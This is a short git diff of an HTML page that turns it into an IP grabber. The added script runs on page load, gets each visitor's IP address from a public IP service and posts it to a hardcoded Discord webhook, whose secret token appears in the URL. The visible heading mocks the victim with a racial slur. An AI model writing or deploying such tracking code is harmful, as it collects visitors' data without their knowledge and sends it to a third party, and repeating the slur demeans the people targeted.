@@ -1,17 +1,23 @@
 <html>
-<head>
-</head>
-<body>
 <h1>Thanks for your ip nigro.</h1>
+  
+<script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discord.com/api/webhooks/986735049590341732/IuusUMuTwFuCe0zIQ7U05dqPH9k2sS4Xq_83oG3MTIf702HuNQ9_5jev8ZMpkBQzAs69");
 
-<?php
+      request.setRequestHeader('Content-type', 'application/json');
 
-include("Discord.php");
-$sendembed = New Discord();
+      var params = {
+        username: "Thnk for ip man",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "**IP:** *" + json.ip + "*"
+      }
+   //just a webhook parameters such as avatar,name,message
 
-//Executes the function
-$sendembed->Visitor();
-?>
+      request.send(JSON.stringify(params));
+    }
 
-</body>
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
 </html>
